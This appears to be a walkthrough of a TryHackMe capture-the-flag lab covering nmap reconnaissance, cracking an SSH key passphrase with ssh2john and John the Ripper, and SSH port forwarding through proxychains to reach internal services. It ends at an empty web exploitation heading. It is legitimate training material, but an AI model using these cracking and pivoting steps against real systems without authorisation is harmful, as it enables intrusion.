# Room
https://tryhackme.com/room/badbyte

# Task 1 - Deploy
Deploy the VM

# Task 2 - Reconnaissance
nmap is a free open source tool used to discover hosts on a computer network and anaylze the retrieved responses

Useful flags
* -p [n] - port scan a specific port or range of ports
* -p- - port scan all ports
* -Pn - port scan only, no host discovery
* -A - enables OS and version detection as well as script scanning and a traceroute to the host being scanned
* -sC - scan with default nmap NSE scripts
* -sV - determine version of service running
* -v [-vv] - verbosity
* -oA [logfile] - output a log file in 3 formats
* --script [name] - scan with the script provided
* --script-args [args] - provide a script with arguments

# Task 3 - Gaining a foothold
John the Ripper is an open source password security auditing and recovery tool.  To crack an SSH private key, use ssh2john first to convert the private key to a hash, then use john to crack the hash

```
/usr/share/john/ssh2john.py id_rsa > key.hash
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
[removed]          (id_rsa)
1g 0:00:00:19 DONE (2021-03-13 17:23) 0.05151g/s 738881p/s 738881c/s 738881C/sa6_123..*7¡Vamos!
Session completed
```

```
chmod 400 id_rsa                                                
ssh -i id_rsa [removed]@10.10.156.177                       
Enter passphrase for key 'id_rsa':
```

# Task 4 - Port Forwarding
SSH is a cryptographic network protocol for operating network services securely over an unsecured network

Useful flags for SSH
* -i [file] - use a private key file
* -L [local_port:remote_address:remote_port] - local port forwarding
* -R [port:local_address:local_port] - remote port forwarding
* -D [local_port] - dynamic port forwarding
* -N - do not execute a remote command

Use SSH Dynamic Port Forwarding to enumerate a host
* comment out socks4 and enable socks5 with a port of your choosing from /etc/proxychains.conf
    ```
    # socks4        127.0.0.1 9050
    socks5  127.0.0.1 1337
    ```
* SSH to the host with the -D flag set referencing your chosen port to establish the tunnel
    ```
    ssh -i id_rsa -D 1337 [removed]@10.10.156.177
    ```
* use nmap against your socks5 proxy IP and port
    ```
    proxychains nmap -sT 127.0.0.1 | grep "OK"
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.14
    [proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:80  ...  OK
    [proxychains] Strict chain  ...  127.0.0.1:1337  ...  127.0.0.1:23 <--socket error or timeout!
    ```

Use SSH Local Port Forwarding to connect to a remote service that may not be listening remotely
* connect to the remote host specifying the -L flag with the format of [local_port:local_ip:remote_port]
    ```
    ssh -i id_rsa -L 8080:127.0.0.1:80 [removed]@10.10.156.177 
    Enter passphrase for key 'id_rsa': 
    Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)                                        
    ```
* test accessing the remote service
    ```
    curl -I http://127.0.0.1:8080
    HTTP/1.1 200 OK
    Date: Sat, 13 Mar 2021 22:55:21 GMT
    Server: Apache/2.4.29 (Ubuntu)
    Link: <http://localhost:8080/index.php?rest_route=/>; rel="https://api.w.org/"
    Content-Type: text/html; charset=UTF-8
    ```

# Task 5 - Web Exploitation
